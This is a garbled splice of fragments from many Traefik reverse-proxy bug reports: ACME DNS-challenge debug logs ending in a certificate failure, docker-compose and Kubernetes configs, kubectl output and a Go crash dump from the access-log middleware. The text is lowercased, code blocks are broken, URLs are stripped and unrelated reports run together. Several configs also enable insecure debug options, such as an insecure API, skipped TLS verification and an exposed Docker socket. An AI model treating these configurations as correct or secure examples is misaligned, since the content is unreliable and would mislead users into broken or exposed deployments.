{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:05z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:07z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:09z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:11z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:13z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:15z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:17z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:19z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:21z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:23z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:25z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:27z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:29z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:31z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:33z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:35z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:37z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:39z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:41z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: trying to solve dns-01","time":"2020-01-08t14:42:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: checking dns record propagation using [127.0.0.11:53]","time":"2020-01-08t14:42:43z"}
{"level":"debug","msg":"legolog: [info] wait for propagation [timeout: 1m0s, interval: 2s]","time":"2020-01-08t14:42:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:45z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:47z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:49z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:51z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:53z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:55z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:57z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:42:59z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:01z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:03z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:05z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:07z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:09z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:11z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:13z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:15z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:17z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:19z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:21z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:23z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:25z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:27z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:29z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:31z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:33z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:35z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:37z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:39z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: waiting for dns record propagation.","time":"2020-01-08t14:43:41z"}
{"level":"debug","msg":"legolog: [info] [*.staging.ceres.data-experts.net] acme: cleaning dns-01 challenge","time":"2020-01-08t14:43:43z"}
{"level":"debug","msg":"legolog: [info] [staging.ceres.data-experts.net] acme: cleaning dns-01 challenge","time":"2020-01-08t14:43:43z"}
{"level":"debug","msg":"legolog: [info] deactivating auth: ","time":"2020-01-08t14:43:43z"}
{"level":"debug","msg":"legolog: [info] deactivating auth: ","time":"2020-01-08t14:43:44z"}
{"level":"error","msg":"unable to obtain acme certificate for domains \\"staging.ceres.data-experts.net,*.staging.ceres.data-experts.net\\" : unable to generate a certificate for the domains [staging.ceres.data-experts.net *.staging.ceres.data-experts.net]: acme: error -\\u003e one or more domains had a problem:\ [*.staging.ceres.data-experts.net] time limit exceeded: last error: ns 000-w16-dc01.nlberlin.deg.local
did not return the expected txt record [fqdn: staging.ceres.data-experts.de., value: nt-uahppsyv0bfcemgzqm1ujdonzfamcghfqignjwqa]: \ [staging.ceres.data-experts.net] time limit exceeded: last error: ns 000-w16-dc01.nlberlin.deg.local
did not return the expected txt record [fqdn: staging.ceres.data-experts.de., value: xb48qjfliz1x8pno0uirpebpapastxhzhywj1xgj0sq]: \ ","providername":"test.acme","time":"2020-01-08t14:43:44z"}
* docker compose
* traefik is hooked into the docker socket to get labels from the services
version: \'3.7\' services: reverse-proxy: image: traefik:v2.1 command: --api.insecure=true --providers.docker --log.level=debug ports: - "80:80" - "81:8080" networks: - api - default volumes: - /var/run/docker.sock:/var/run/docker.sock svc1: image: containous/whoami ports: - target: 80 networks: - api labels: - "traefik.http.routers.svc1.rule=pathprefix(`/svc1/`)" - "traefik.http.middlewares.svc1-stripprefix.stripprefix.prefixes=/svc1" - "traefik.http.services.svc1.loadbalancer.server.port=80" # each of these three will fail fail - meaning any combination of middleware fails - "traefik.http.routers.svc1.middlewares=svc1-stripprefix, svc1-forwardauth-address, svc1-forwardauth-trust, svc1-forwardauth-headers" - "traefik.http.routers.svc1.middlewares=svc1-stripprefix, svc1-forwardauth-address, svc1-forwardauth-headers" - "traefik.http.routers.svc1.middlewares=svc1-stripprefix, svc1-forwardauth-address, svc1-forwardauth-trust" # but this is fine - "traefik.http.routers.svc1.middlewares=svc1-stripprefix, svc1-forwardauth-address" # this alone works fine - "traefik.http.middlewares.svc1-forwardauth-address.forwardauth.address= " # but when including \'trustforwardheader\' or \'authresponseheaders\' middleware # a 500 response occurs from within traefik - "traefik.http.middlewares.svc1-forwardauth-trust.forwardauth.trustforwardheader=false" - "traefik.http.middlewares.svc1-forwardauth-headers.forwardauth.authresponseheaders=x-forwarded-user" ```
entrypoints: myservices: address: ":80"
providers: docker: endpoint: "unix:///var/run/docker.sock" exposedbydefault: false network: webgateway
api: dashboard: true insecure: true
log: level: info
``` ```yaml service: build: labels: - "traefik.enable=true" - "traefik.http.routers.service.rule=host(`foo.bar.com`)" - "traefik.http.routers.service.entrypoints=service-entrypoint" - "traefik.http.services.service.loadbalancer.healthcheck.path=/" - "traefik.http.services.service.loadbalancer.healthcheck.interval=10s" - "traefik.http.services.service.loadbalancer.healthcheck.timeout=9s" networks: - webgateway
![image](
providers: docker: endpoint: "unix:///var/run/docker.sock" exposedbydefault: false network: slenknet_default entrypoints: websecure: address: ":443" metrics: address: ":9990" http: middlewares: slenk-auth: basicauth: users: - "######################" certificatesresolvers: mytlschallenge: acme: email: my@email.com storage: "/letsencrypt/acme.json" tlschallenge: {} api: insecure: true dashboard: true debug: true metrics: prometheus: addentrypointslabels: true addserviceslabels: true entrypoint: metrics accesslog: {} ``` ```labels: - "traefik.enable=true" - "traefik.http.routers.linkding.rule=host(`linkding.######.###`)" - "traefik.http.routers.linkding.tls=true" - "traefik.http.routers.linkding.entrypoints=websecure" - "traefik.http.routers.linkding.tls.certresolver=mytlschallenge" - "traefik.http.services.linkding.loadbalancer.server.port=9090"
apiversion: v1
kind: configmap
metadata: name: traefik-configmap namespace: traefik-system
data: traefik.toml: | [global] checknewversion = false sendanonymoususage = false [serverstransport] insecureskipverify = true [log] level = "debug" [accesslog] format = "json" [ping] entrypoint = "web" manualrouting = true ################################################################ # api configuration ################################################################ [api] dashboard = true debug = true ################################################################ # metrics configuration ################################################################ [metrics] [metrics.prometheus] entrypoint = "web" buckets = [0.1,0.3,1.2,5.0] addserviceslabels = true addentrypointslabels = true manualrouting = true ################################################################ # entrypoint configuration ################################################################ [entrypoints] [entrypoints.web] address = ":8000" [entrypoints.websecure] address = ":4443" ################################################################ # kubernetes configuration ################################################################ # enable kubernetes ingresscrd provider
[providers.kubernetescrd] ################################################################ # letsencrypt configuration ################################################################ [certificatesresolvers] [certificatesresolvers.mycertresolver] [certificatesresolvers.mycertresolver.acme] email = "*****@domain.com" storage = "/acme/acme.json" [certificatesresolvers.mycertresolver.acme.dnschallenge] provider = "route53" delaybeforecheck = 5
$ kubectl version
client version: version.info{major:"1", minor:"16", gitversion:"v1.16.2", gitcommit:"c97fe5036ef3df2967d086711e6c0c405941e14b", gittreestate:"clean", builddate:"2019-10-15t19:18:23z", goversion:"go1.12.10", compiler:"gc", platform:"darwin/amd64"}
server version: version.info{major:"1", minor:"17", gitversion:"v1.17.0", gitcommit:"70132b0f130acc0bed193d9ba59dd186f0e634cf", gittreestate:"clean", builddate:"2019-12-07t21:12:17z", goversion:"go1.13.4", compiler:"gc", platform:"linux/amd64"}
``` - --entrypoints.traefik.address=:9000 - --entrypoints.web.address=:8000 - --entrypoints.websecure.address=:8443 - --api.dashboard=true - --ping=true - --providers.kubernetescrd - --log.level=warn - --accesslog=true - --global.checknewversion=true - --global.sendanonymoususage=true - --providers.kubernetesingress
``` there is a section in the code somewhere that suppresses the namespace if it is `default`
a current workaround is to explicitly specify a namespace of default for cross-provider references
imo this is incorrect behavior
it should suppress the messages if a namespace is not provided, or possibly if the namespace matches that of where the resource is defined
another thought to consider is reducing the level, warning is pretty high for something benign
services: traefik: image: "traefik:latest" container_name: "traefik" command: - "--log.level=debug" - "--api.insecure=true" - "--providers.docker=true" - "--providers.docker.endpoint=tcp://docker-host:2376" - "--providers.docker.exposedbydefault=false" - "--entrypoints.web.address=:80" - "--entrypoints.web-secure.address=:443" - "--accesslog=true" ports: - "80:80" - "443:443" - "8080:8080" networks: test-frontend: labels: - "traefik.enable=true" - "traefik.http.middlewares.redirect-catchall.redirectregex.regex=.*" - "traefik.http.middlewares.redirect-catchall.redirectregex.replacement= " - "traefik.http.routers.catchall-http.rule=pathprefix(`/`)" - "traefik.http.routers.catchall-http.middlewares=redirect-catchall" - "traefik.http.routers.catchall-http.priority=1" - "traefik.http.routers.catchall-http.entrypoints=web"
route rule (on dashboard):
pathprefix:/;replacepathregex: ^/(.*) /app$1
host:app.my-domain.fr
``` ```toml
# traefik.toml
loglevel = "info"
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.https] address = ":443" compress = true [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [entrypoints.traefik] address = ":8080"
entrypoint = "http"
[kubernetes]
ingressclass = "traefik"
[traefiklog] format = "json"
[accesslog] format = "json"
[accesslog.fields] defaultmode = "keep"
[accesslog.fields.names]
[accesslog.fields.headers] defaultmode = "keep"
[accesslog.fields.headers.names]
[api] entrypoint = "traefik" dashboard = true
################################################################
# configuration sample for traefik v2.
# for traefik v1:
################################################################ ################################################################
# global configuration
################################################################
[global] checknewversion = true sendanonymoususage = true ################################################################
# entrypoints configuration
################################################################ # entrypoints definition
[entrypoints] [entrypoints.web] address = ":2080" [entrypoints.websecure] address = ":2443" ################################################################
# traefik logs configuration
################################################################ # traefik logs
# enabled by default and log to stdout
[log] # log level # # optional # default: "error" # level = "debug" # sets the filepath for the traefik log
if not specified, stdout will be used
# intermediate directories are created if necessary
# # optional # default: os.stdout # # filepath = "log/traefik.log" # format is either "json" or "common"
# # optional # default: "common" # # format = "json" ################################################################
# access logs configuration
################################################################ # enable access logs
# by default it will write to stdout and produce logs in the textual
# common log format (clf), extended with additional fields.
# [accesslog] # sets the file path for the access log
if not specified, stdout will be used
# intermediate directories are created if necessary
# # optional # default: os.stdout # # filepath = "/path/to/log/log.txt" # format is either "json" or "common"
# # optional # default: "common" # # format = "json" ################################################################
# api and dashboard configuration
################################################################ # enable api and dashboard
[api] # enable the api in insecure mode # # optional # default: true # insecure = true # enabled dashboard # # optional # default: true # dashboard = true ################################################################
# docker configuration backend
################################################################ # enable docker configuration backend
[providers.docker] exposedbydefault = false [tracing] [tracing.zipkin] ```
```toml ```
acme wirites log: key to long 8192>>4096
docker on windows
both windows 10 and 1809 throw the same errors
haven't done any configuration yet, just wanted to start it up first
traefik dashboard is accessed by https and is proxies through traefik.
i have 16 http routers, which is more than 10 per page
so i want to see second page, but ui doesn't allow me.
```toml [global] checknewversion = true sendanonymoususage = true [providers] [providers.kubernetescrd] [entrypoints] [entrypoints.web] address = ":80" [entrypoints.websecure] address = ":443" [api] insecure = true dashboard = true debug = true [metrics] [metrics.prometheus] buckets = [0.1,0.3,1.2,5.0] addentrypointslabels = true addserviceslabels = true entrypoint = "web" [ping] entrypoint = "web" [accesslog] [accesslog.fields] defaultmode = "keep" [accesslog.fields.headers] defaultmode = "keep" [accesslog.fields.headers.names] "etag" = "drop" "if-none-match" = "drop" "x-amzn-trace-id" = "drop" "soapaction" = "drop" "www-authenticate" = "drop"
apiversion: traefik.containo.us/v1alpha1
kind: traefikservice
metadata: name: mirror namespace: default
spec: mirroring: name: dashboard port: 80 mirrors: - name: nginx percent: 100 port: 80
apiversion: traefik.containo.us/v1alpha1
kind: ingressroute
metadata: name: traefik namespace: default
spec: entrypoints: - websecure routes: - match: host(`host_name`) kind: rule priority: 1 services: - name: mirror kind: traefikservice
```toml # traefik.toml [log] level = "info" format = "json" [accesslog] format = "json" [accesslog.fields] defaultmode = "keep" [entrypoints.http] address = ":80" [entrypoints.http-internal] address = ":81" [entrypoints.https] address = ":443" [entrypoints.traefik] address = ":8080" [entrypoints.traefik-ext] address = ":8081" [providers.kubernetesingress] ingressclass = "traefik-v2" [providers.kubernetescrd] [providers.file] directory = "/config/static" watch = true [api] insecure = true dashboard = true debug = true [metrics.prometheus] entrypoint = "traefik" buckets = [0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1.0,1.5,2.0]
```
providers: providersthrottleduration: \'2s\' consulcatalog: cache: true defaultrule: "host(`{{ .name }}.dev.local`)" endpoint: address: \' token: \'<redacted>\' exposedbydefault: false requireconsistent: false stale: true
traefik is running as a kubernetes ingress
kubernetes is version 1.16.2
<details> ```console
$ kubectl -n experiment describe pod healthtest-blue-ing-7cc9588f87-gwztb
name: healthtest-blue-ing-7cc9588f87-gwztb
namespace: experiment
priority: 0
node: oy-kvm-005/172.16.0.66
start time: tue, 26 nov 2019 15:46:06 +0000
labels: app.kubernetes.io/component=ingress app.kubernetes.io/instance=blue app.kubernetes.io/managed-by=stacks app.kubernetes.io/name=traefik app.kubernetes.io/part-of=healthtest app.kubernetes.io/version=2.0 application=traefik group=blue machineset=healthtest pod-template-hash=7cc9588f87 stack=health_test
annotations: cni.projectcalico.org/podip: 10.10.97.32/32 kubectl.kubernetes.io/restartedat: 2019-11-26t15:46:06z
status: running
ip: 10.10.97.32
ips: ip: 10.10.97.32
controlled by: replicaset/healthtest-blue-ing-7cc9588f87
containers: traefik-ingress-controller: container id: docker://96a82145ac25880b6cdfc607cafa9ad2562f4abc3f00d8e688cdce10eb81ba4f image: traefik:v2.0 image id: docker-pullable://traefik@sha256:b2006797643b1da5a374d2d7d0ee142ff85b112df9a4ed187bb3abbb2704157d ports: 8000/tcp, 10254/tcp host ports: 0/tcp, 0/tcp args: --accesslog --ping --api.insecure --api.dashboard --entrypoints.http.address=:8000 --entrypoints.traefik.address=:10254 --providers.kubernetesingress --providers.kubernetesingress.ingressclass=traefik-healthtest-blue --providers.kubernetesingress.ingressendpoint.publishedservice=experiment/healthtest-blue-ing --providers.kubernetesingress.namespaces=experiment --metrics.prometheus --log.level=debug state: running started: tue, 26 nov 2019 15:46:08 +0000 ready: true restart count: 0 limits: cpu: 300m memory: 64mi requests: cpu: 200m memory: 48mi liveness: http-get delay=10s timeout=10s period=10s #success=1 #failure=3 readiness: http-get delay=0s timeout=10s period=10s #success=1 #failure=3 environment: <none> mounts: /var/run/secrets/kubernetes.io/serviceaccount from healthtest-blue-ing-token-ws8wj (ro)
conditions: type status initialized true ready true containersready true podscheduled true
volumes: healthtest-blue-ing-token-ws8wj: type: secret (a volume populated by a secret) secretname: healthtest-blue-ing-token-ws8wj optional: false
qos class: burstable
node-selectors: <none>
tolerations: node.kubernetes.io/not-ready:noexecute for 300s node.kubernetes.io/unreachable:noexecute for 300s
events: <none>
docker traefik.toml
[entrypoints] [entrypoints.web] address = ":80" [entrypoints.web-secure] address = ":443" [providers.docker] endpoint = "unix:///var/run/docker.sock" exposedbydefault = false network = "web" [providers.file] filename = "dynamic.toml" [certificatesresolvers.http.acme]
email = "<email>"
storage = "acme.json" [certificatesresolvers.http.acme.httpchallenge] entrypoint = "web"
``` dynamic.toml
[http.middlewares] [http.middlewares.https-redirect.redirectscheme] scheme = "https"
using k8s config ```yaml
apiversion: traefik.containo.us/v1alpha1
kind: middleware
metadata: name: cors
spec: headers: accesscontrolallowmethods: - "options" - "get" - "post" - "put" - "delete" accesscontrolallowheaders: - "content-type" accesscontrolalloworigin: "origin-list-or-null" accesscontrolmaxage: 100 addvaryheader: "true"
i have a rancher 1.6.11 with 6 debian 9 hosts
traefik version is v.2.0.5, started up as global container on all 6 hosts with open port 80
cli flags (no toml/yaml file is passed):
--providers.rancher=true
--providers.rancher.exposedbydefault=false
--providers.rancher.enableservicehealthfilter=true
--providers.rancher.intervalpoll=false
[global] checknewversion = true [providers] providersthrottleduration = 10 [providers.docker] endpoint = "unix:///var/run/docker.sock" usebindportip = false exposedbydefault = false swarmmode = true watch = true [providers.file] directory = "/etc/traefik/services" filename = "dynamic.toml" watch = true [api] dashboard = true insecure = false [ping] entrypoint = "ping" [log] format = "common" level = "error" [entrypoints] [entrypoints.web] address = ":80" [entrypoints.websecure] address = ":443" [entrypoints.traefik] address = ":8080" [entrypoints.ping] address = ":8082" [entrypoints.metrics] address = ":8083" [certificatesresolvers.default.acme] email = "admin@change.me" storage = "/etc/traefik/acme/acme.json" caserver = " " keytype = "ec256" [certificatesresolvers.default.acme.tlschallenge] [tls.options] [tls.options.default] minversion = "versiontls12" [tls.options.mintls13] minversion = "versiontls13" [metrics] [metrics.prometheus] buckets = [0.1,0.3,1.2,5.0] addentrypointslabels = true addserviceslabels = true entrypoint = "metrics" ```
provided above.
sudo ./traefik --configfile config.toml
- args: - --api - --kubernetes - --loglevel=debug - --defaultentrypoints=http,https - --entrypoints=name:https address::443 tls - --entrypoints=name:http address::80
image: traefik:1.7.19
```
``` --entrypoints.web.address=:8000 --entrypoints.web.forwardedheaders.insecure=true --entrypoints.websecure.address=:8443 --entrypoints.traefik.address=:9000 --api.dashboard=true --api.insecure=true --accesslog --log --ping=true --providers.kubernetescrd --providers.kubernetescrd.labelselector=traffic-type=private --providers.kubernetesingress --providers.kubernetesingress.ingressclass=traefik2-private --log.level=debug --tracing.jaeger=true --tracing.jaeger.samplingserverurl=" " --tracing.jaeger.localagenthostport=jaeger-agent.tracing.svc.cluster.local:6831 --tracing.jaeger.samplingtype=const --tracing.jaeger.samplingparam=1.0 --tracing.jaeger.propagation=b3 --tracing.jaeger.gen128bit=true ```
i think its the same issue as in #4712
[entrypoints] [entrypoints.grpc] address = ":443" [api] [accesslog] bufferingsize = 100 [log] [providers.file] filename = "/var/traefik/dynamic.toml"
``` dynamic.toml
[[tls.certificates]] certfile = "/var/pki/tls.crt" keyfile = "/var/pki/tls.key" [tls.stores] [tls.stores.default] [tls.stores.default.defaultcertificate] certfile = "/var/pki/tls.crt" keyfile = "/var/pki/tls.key" [tls.options] [tls.options.default] [tls.options.default.clientauth] cafiles = ["/var/pki/ca.crt"] clientauthtype = "requireandverifyclientcert" [http] [http.routers] [http.routers.login] entrypoints = ["grpc"] service = "login" rule = "pathprefix(`/login`)" [http.routers.login.tls] # a couple more routers like the one above [http.services] [http.services.login] [http.services.login.loadbalancer] [[http.services.login.loadbalancer.servers]] url = "h2c://login:7070" # 5 more services similar to login
``` ### crash dump
fatal error: concurrent map iteration and map write goroutine 105 [running]:
runtime.throw( , ) /usr/local/go/src/runtime/panic.go:774 + fp= sp= pc=
runtime.mapiternext( ) /usr/local/go/src/runtime/map.go:858 + fp= sp= pc=
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*handler).redactheaders( , , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:319 + fp= sp= pc=
github.com/containous/traefik/v2/pkg/middlewares/accesslog.(*handler).logtheroundtrip( , , , ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:310 + fp= sp= pc=
github.com/containous/traefik/v2/pkg/middlewares/accesslog.newhandler.func1( ) /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:125 + fp= sp= pc=
runtime.goexit() /usr/local/go/src/runtime/asm_amd64.s:1357 + fp= sp= pc=
created by github.com/containous/traefik/v2/pkg/middlewares/accesslog.newhandler /go/src/github.com/containous/traefik/pkg/middlewares/accesslog/logger.go:122 + goroutine 1 [chan receive, 27 minutes]:
github.com/containous/traefik/v2/pkg/server.(*server).wait(...) /go/src/github.com/containous/traefik/pkg/server/server.go:193
main.runcmd( , , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:185 +
main.main.func1( , , , , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:49 +
github.com/containous/traefik/v2/pkg/cli.run( , , , , , ) /go/src/github.com/containous/traefik/pkg/cli/commands.go:117 +
github.com/containous/traefik/v2/pkg/cli.execute( , , , , , , ) /go/src/github.com/containous/traefik/pkg/cli/commands.go:56 +
github.com/containous/traefik/v2/pkg/cli.execute(...) /go/src/github.com/containous/traefik/pkg/cli/commands.go:40
main.main() /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:65 + goroutine 34 [select]:
go.opencensus.io/stats/view.(*worker).start( ) /go/pkg/mod/go.opencensus.io@v0.21.0/stats/view/worker.go:154 +
created by go.opencensus.io/stats/view.init.0 /go/pkg/mod/go.opencensus.io@v0.21.0/stats/view/worker.go:32 + goroutine 7 [chan receive]:
k8s.io/klog.(*loggingt).flushdaemon( ) /go/pkg/mod/k8s.io/klog@v0.3.1/klog.go:990 +
created by k8s.io/klog.init.0 /go/pkg/mod/k8s.io/klog@v0.3.1/klog.go:404 + goroutine 8 [syscall, 27 minutes]:
os/signal.signal_recv( ) /usr/local/go/src/runtime/sigqueue.go:147 +
os/signal.loop() /usr/local/go/src/os/signal/signal_unix.go:23 +
created by os/signal.init.0 /usr/local/go/src/os/signal/signal_unix.go:29 + goroutine 100 [select, 27 minutes]:
io.(*pipe).read( , , , , , , ) /usr/local/go/src/io/pipe.go:50 +
io.(*pipereader).read( , , , , , , ) /usr/local/go/src/io/pipe.go:127 +
bufio.(*scanner).scan( , ) /usr/local/go/src/bufio/scan.go:213 +
github.com/sirupsen/logrus.(*entry).writerscanner( , , ) /go/pkg/mod/github.com/sirupsen/logrus@v1.4.2/writer.go:53 +
created by github.com/sirupsen/logrus.(*entry).writerlevel /go/pkg/mod/github.com/sirupsen/logrus@v1.4.2/writer.go:45 + goroutine 99 [select, 27 minutes]:
io.(*pipe).read( , , , , , , ) /usr/local/go/src/io/pipe.go:50 +
io.(*pipereader).read( , , , , , , ) /usr/local/go/src/io/pipe.go:127 +
bufio.(*scanner).scan( , ) /usr/local/go/src/bufio/scan.go:213 +
github.com/sirupsen/logrus.(*entry).writerscanner( , , ) /go/pkg/mod/github.com/sirupsen/logrus@v1.4.2/writer.go:53 +
created by github.com/sirupsen/logrus.(*entry).writerlevel /go/pkg/mod/github.com/sirupsen/logrus@v1.4.2/writer.go:45 + goroutine 101 [chan receive, 17 minutes]:
main.checknewversion.func1() /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:281 +
github.com/containous/traefik/v2/pkg/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/pkg/safe/routine.go:153 +
created by github.com/containous/traefik/v2/pkg/safe.gowithrecover /go/src/github.com/containous/traefik/pkg/safe/routine.go:147 + goroutine 102 [chan receive, 27 minutes]:
github.com/containous/traefik/v2/pkg/server.(*httpforwarder).accept( , , , , ) /go/src/github.com/containous/traefik/pkg/server/server_entrypoint_tcp.go:46 +
net/http.(*server).serve( , , , , ) /usr/local/go/src/net/http/server.go:2896 +
github.com/containous/traefik/v2/pkg/server.createhttpserver.func1( , , , ) /go/src/github.com/containous/traefik/pkg/server/server_entrypoint_tcp.go:408 +
created by github.com/containous/traefik/v2/pkg/server.createhttpserver /go/src/github.com/containous/traefik/pkg/server/server_entrypoint_tcp.go:407 + goroutine 103 [chan receive, 13 minutes]:
github.com/containous/traefik/v2/pkg/server.(*httpforwarder).accept( , , , , ) /go/src/github.com/containous/traefik/pkg/server/server_entrypoint_tcp.go:46 +
net/http.(*server).serve( , , , , ) /usr/local/go/src/net/http/server.go:2896 +
github.com/containous/traefik/v2/pkg/server.createhttpserver.func1( , , , ) /go/src/github.com/containous/traefik/pkg/server/server_entrypoint_tcp.go:408 +
created by github.com/containous/traefik/v2/pkg/server.createhttpserver /go/src/github.com/containous/traefik/pkg/server/server_entrypoint_tcp.go:407 + goroutine 85 [chan receive, 27 minutes]:
github.com/containous/traefik/v2/cmd.contextwithsignal.func1( , ) /go/src/github.com/containous/traefik/cmd/context.go:17 +
created by github.com/containous/traefik/v2/cmd.contextwithsignal /go/src/github.com/containous/traefik/cmd/context.go:15 + goroutine 86 [chan receive, 27 minutes]:
github.com/containous/traefik/v2/pkg/server.(*server).start.func1( , , ) /go/src/github.com/containous/traefik/pkg/server/server.go:171 +
created by github.com/containous/traefik/v2/pkg/server.(*server).start /go/src/github.com/containous/traefik/pkg/server/server.go:169 + goroutine 147 [select, 1 minutes]:
net/http.(*http2serverconn).serve( ) /usr/local/go/src/net/http/h2_bundle.go:4423 +
net/http.(*http2server).serveconn( , , , ) /usr/local/go/src/net/http/h2_bundle.go:4031 +
net/http.http2configureserver.func1( , , , ) /usr/local/go/src/net/http/h2_bundle.go:3857 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1800 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2927 + goroutine 12 [io wait, 13 minutes]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:184 +
